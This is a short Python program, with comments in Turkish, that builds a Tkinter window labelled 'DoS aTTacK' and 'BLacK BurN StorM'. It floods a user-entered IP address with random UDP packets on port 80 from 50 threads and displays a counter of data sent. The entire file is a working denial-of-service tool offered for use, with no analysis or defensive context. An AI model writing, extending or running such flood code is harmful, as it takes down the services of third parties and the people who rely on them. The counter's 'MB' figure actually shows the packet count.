import threading
import socket
import tkinter as tk
import time
import random

# Hedef IP
target_ip = ""

# Veri gönderimi sayaçları
sent_data = 0
attack_threads = []
attack_running = False

def dos_attack():
    global sent_data, attack_running
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(1024)
            s.sendto(bytes_data, (target_ip, 80))
            sent_data += 1
        except:
            pass
        time.sleep(0.01)  # Daha az CPU kullanımı

def start_attack():
    global attack_threads, attack_running, sent_data, target_ip
    if not attack_running:
        target_ip = ip_entry.get()
        if not target_ip:
            return
        attack_running = True
        sent_data = 0
        for _ in range(50):  # 50 thread
            t = threading.Thread(target=dos_attack)
            t.daemon = True
            t.start()
            attack_threads.append(t)

def stop_attack():
    global attack_running
    attack_running = False

def update_counter():
    counter_label.config(text=f"Sent Data: {sent_data * 1024 // 1024} MB")
    root.after(500, update_counter)

# GUI Başlangıcı
root = tk.Tk()
root.title("BLacK BurN StorM") 
root.geometry("400x300")
root.resizable(False, False)

# Başlık
title = tk.Label(root, text="*  DoS aTTacK  *", font=("Courier New", 18, "bold"), fg="red")
title.pack(pady=10)

# IP Giriş
ip_label = tk.Label(root, text="Target IP Address:", font=("Courier", 10))
ip_label.pack()
ip_entry = tk.Entry(root, width=30, font=("Courier", 12))
ip_entry.pack(pady=5)

# ATTACK Butonları
button_frame = tk.Frame(root)
button_frame.pack(pady=20)

attack1 = tk.Button(button_frame, text="ATTACK!", font=("Courier New", 12, "bold"), bg="black", fg="white", width=10, command=start_attack)
attack1.grid(row=0, column=0, padx=5)

attack2 = tk.Button(button_frame, text="ATTACK!", font=("Courier New", 12, "bold"), bg="black", fg="white", width=10, command=start_attack)
attack2.grid(row=0, column=1, padx=5)

attack3 = tk.Button(button_frame, text="ATTACK!", font=("Courier New", 12, "bold"), bg="black", fg="white", width=10, command=start_attack)
attack3.grid(row=0, column=2, padx=5)

# Gönderilen veri göstergesi
counter_label = tk.Label(root, text="Sent Data: 0 MB", font=("Courier", 10))
counter_label.pack()

# Güncelleyici
update_counter()

# Çıkarken saldırıyı durdur
def on_close():
    stop_attack()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_close)
root.mainloop()

